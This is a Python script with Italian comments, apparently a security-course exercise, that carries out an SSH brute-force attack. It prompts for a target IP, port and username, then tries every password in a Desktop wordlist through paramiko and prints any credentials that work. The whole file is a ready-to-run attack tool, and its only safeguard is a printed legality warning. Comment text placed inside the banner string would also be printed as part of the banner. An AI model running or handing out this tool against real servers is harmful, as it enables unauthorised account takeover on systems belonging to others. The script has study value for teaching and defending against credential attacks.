import paramiko  # Importa la libreria paramiko, necessaria per connettersi a un server SSH e gestire connessioni sicure.
import time  # Importa la libreria time, usata per introdurre ritardi (es. time.sleep) durante i tentativi di connessione.
import os  # Importa la libreria os, usata per interagire con il sistema operativo (es. per verificare l'esistenza di file).

# Codici ANSI per i colori
COLORS = {  # Definisce un dizionario chiamato COLORS che contiene codici ANSI per colorare il testo nel terminale.
    'BOLD_AZZURRO': '\033[1;96m',  # Colore azzurro brillante (grassetto) per titoli e sezioni principali.
    'AZZURRO': '\033[96m',  # Colore azzurro chiaro per testo informativo o decorativo.
    'VIOLA': '\033[95m',  # Colore viola per evidenziare i tentativi di connessione.
    'GIALLO': '\033[93m',  # Colore giallo per avvisi o istruzioni importanti.
    'VERDE': '\033[92m',  # Colore verde per indicare successi (es. accesso riuscito).
    'ROSSO': '\033[91m',  # Colore rosso per errori o avvisi critici.
    'BOLD': '\033[1m',  # Stile grassetto per enfatizzare il testo.
    'RESET': '\033[0m'  # Resetta i colori e gli stili, tornando al testo predefinito del terminale.
}

def mostra_introduzione():  # Definisce una funzione chiamata mostra_introduzione che stampa l'introduzione del programma.
    print(f"""  # Inizia la stampa di una stringa multilinea formattata per l'introduzione.
    {COLORS['BOLD_AZZURRO']}  # Applica il colore azzurro brillante per la prima riga.
    ====================================================  # Stampa una linea di separazione fatta di 51 caratteri "=".
    ███████╗██████╗ ██╗ ██████╗ ██████╗ ██████╗ ███████╗  # Prima riga dell'ASCII art che rappresenta "EPICODE".
    ██╔════╝██╔══██╗██║██╔════╝██╔═══██╗██╔══██╗██╔════╝  # Seconda riga dell'ASCII art.
    █████╗  ██████╔╝██║██║     ██║   ██║██║  ██║█████╗    # Terza riga dell'ASCII art.
    ██╔══╝  ██╔═══╝ ██║██║     ██║   ██║██║  ██║██╔══╝    # Quarta riga dell'ASCII art.
    ███████╗██║     ██║╚██████╗╚██████╔╝██████╔╝███████╗  # Quinta riga dell'ASCII art.
    ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝  # Sesta riga dell'ASCII art.
    {COLORS['AZZURRO']}===================================================={COLORS['RESET']}  # Stampa una linea di separazione azzurra chiara e resetta i colori.
    {COLORS['BOLD']}Autore: Davide Mirani\n{COLORS['RESET']}  # Stampa il nome dell'autore in grassetto e resetta lo stile.
    {COLORS['VIOLA']}Tool per test di sicurezza SSH - Brute Force\n{COLORS['RESET']}  # Stampa il titolo del tool in viola e resetta i colori.
    {COLORS['GIALLO']}ISTRUZIONI:{COLORS['RESET']}  # Stampa l'intestazione "ISTRUZIONI" in giallo e resetta i colori.
    - Inserisci l'indirizzo IP target.    # Prima istruzione per l'utente.
    - Specifica la porta SSH (premi Invio per usare la porta 22).  # Seconda istruzione per l'utente.
    - Fornisci il nome utente da testare.  # Terza istruzione per l'utente.
    - Assicurati che il file 'passwords.txt' sia presente sul Desktop.\n    # Quarta istruzione per l'utente, con una nuova riga.
    {COLORS['GIALLO']}ATTENZIONE:{COLORS['RESET']}  # Stampa l'intestazione "ATTENZIONE" in giallo e resetta i colori.
    {COLORS['ROSSO']}L'uso non autorizzato è illegale e vietato!{COLORS['RESET']}  # Stampa un avviso in rosso e resetta i colori.
    {COLORS['AZZURRO']}===================================================={COLORS['RESET']}  # Stampa una linea di separazione azzurra chiara e resetta i colori.
    """)  # Chiude la stringa multilinea e termina la stampa.
    input(f"{COLORS['GIALLO']}Premi INVIO per continuare...{COLORS['RESET']}\n")  # Chiede all'utente di premere Invio per continuare, con il messaggio in giallo.

def ssh_bruteforce(host, port, username, password_list, timeout=5):  # Definisce una funzione ssh_bruteforce che esegue un attacco di forza bruta su SSH.
    client = paramiko.SSHClient()  # Crea un oggetto SSHClient per gestire la connessione SSH.
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Imposta una politica per accettare automaticamente chiavi host sconosciute.

    for i, password in enumerate(password_list, 1):  # Itera sulla lista delle password, con un contatore i che parte da 1.
        password = password.strip()  # Rimuove spazi o caratteri di nuova riga dalla password corrente.
        try:
            print(f"{COLORS['VIOLA']}▶ Tentativo {i}: {COLORS['BOLD']}{username}:{password}{COLORS['RESET']}")  # Stampa il tentativo corrente in viola, con username e password in grassetto.
            client.connect(hostname=host, port=port, username=username, password=password, timeout=timeout)  # Tenta di connettersi al server SSH con i parametri forniti.
            print(f"\n{COLORS['VERDE']}{'#' * 60}")  # Stampa una linea di separazione verde di 60 caratteri "#" in caso di successo.
            print(f"{COLORS['BOLD']}⚡ ACCESSO CONSENTITO! {COLORS['RESET']}")  # Stampa un messaggio di successo in grassetto.
            print(f"{COLORS['VERDE']}👤 Utente: {username}")  # Stampa l'username in verde.
            print(f"🔑 Password: {password}")  # Stampa la password trovata.
            print(f"{'#' * 60}{COLORS['RESET']}\n")  # Stampa una linea di separazione finale e resetta i colori.
            return password  # Restituisce la password trovata e termina la funzione.
        except paramiko.AuthenticationException:  # Gestisce l'eccezione per autenticazione fallita.
            print(f"{COLORS['ROSSO']}✖ Errore autenticazione{COLORS['RESET']}")  # Stampa un messaggio di errore in rosso.
        except paramiko.SSHException as e:  # Gestisce eccezioni specifiche di SSH.
            print(f"{COLORS['GIALLO']}⚠ Errore SSH: {str(e)}{COLORS['RESET']}")  # Stampa l'errore SSH in giallo.
            time.sleep(1)  # Aspetta 1 secondo per evitare blocchi o limitazioni del server.
        except Exception as e:  # Gestisce qualsiasi altra eccezione non prevista.
            print(f"{COLORS['ROSSO']}☠ Errore critico: {str(e)}{COLORS['RESET']}")  # Stampa l'errore critico in rosso.
        finally:  # Esegue questo blocco indipendentemente dal risultato del tentativo.
            client.close()  # Chiude la connessione SSH.

    print(f"\n{COLORS['ROSSO']}🔍 Ricerca completata. Nessuna password valida trovata.{COLORS['RESET']}")  # Stampa un messaggio di fallimento in rosso se nessuna password è valida.
    return None  # Restituisce None se non viene trovata nessuna password valida.

if __name__ == "__main__":  # Verifica se lo script viene eseguito direttamente (non importato come modulo).
    mostra_introduzione()  # Chiama la funzione mostra_introduzione per stampare l'introduzione.

    target_host = input(f"{COLORS['AZZURRO']}🎯 Indirizzo IP target: {COLORS['RESET']}").strip()  # Chiede all'utente l'indirizzo IP del server target e rimuove spazi.
    port_input = input(f"{COLORS['AZZURRO']}🔌 Porta SSH [22]: {COLORS['RESET']}").strip()  # Chiede all'utente la porta SSH, con valore predefinito 22, e rimuove spazi.
    target_port = int(port_input) if port_input else 22  # Converte la porta in intero; usa 22 se l'input è vuoto.
    username = input(f"{COLORS['AZZURRO']}👤 Nome utente: {COLORS['RESET']}").strip()  # Chiede all'utente il nome utente e rimuove spazi.

    password_file = os.path.expanduser("~/Desktop/passwords.txt")  # Definisce il percorso del file delle password (passwords.txt sul Desktop).

    if not os.path.isfile(password_file):  # Verifica se il file passwords.txt esiste.
        print(f"\n{COLORS['ROSSO']}🗙 ERRORE: File {password_file} non trovato!{COLORS['RESET']}")  # Stampa un messaggio di errore in rosso se il file non esiste.
        exit(1)  # Termina il programma con codice di uscita 1 (errore).

    with open(password_file, "r") as f:  # Apre il file passwords.txt in modalità lettura.
        passwords = f.readlines()  # Legge tutte le righe del file e le salva in una lista chiamata passwords.

    if not passwords:  # Verifica se la lista delle password è vuota.
        print(f"\n{COLORS['ROSSO']}🗙 ERRORE: Il file delle password è vuoto!{COLORS['RESET']}")  # Stampa un messaggio di errore in rosso se il file è vuoto.
        exit(1)  # Termina il programma con codice di uscita 1 (errore).

    print(f"\n{COLORS['BOLD_AZZURRO']}⚔ Inizio attacco su {target_host}:{target_port}...{COLORS['RESET']}")  # Stampa un messaggio di inizio attacco in azzurro brillante.
    found = ssh_bruteforce(target_host, target_port, username, passwords)  # Esegue l'attacco di forza bruta e salva il risultato in found.

    if found:  # Verifica se è stata trovata una password valida.
        print(f"{COLORS['VERDE']}✅ Successo! Credenziali valide: {username}:{found}{COLORS['RESET']}")  # Stampa un messaggio di successo in verde con le credenziali.
    else:  # Se non è stata trovata una password valida.
        print(f"{COLORS['ROSSO']}⛔ Nessuna credenziale valida trovata. Riprovare.{COLORS['RESET']}")  # Stampa un messaggio di fallimento in rosso.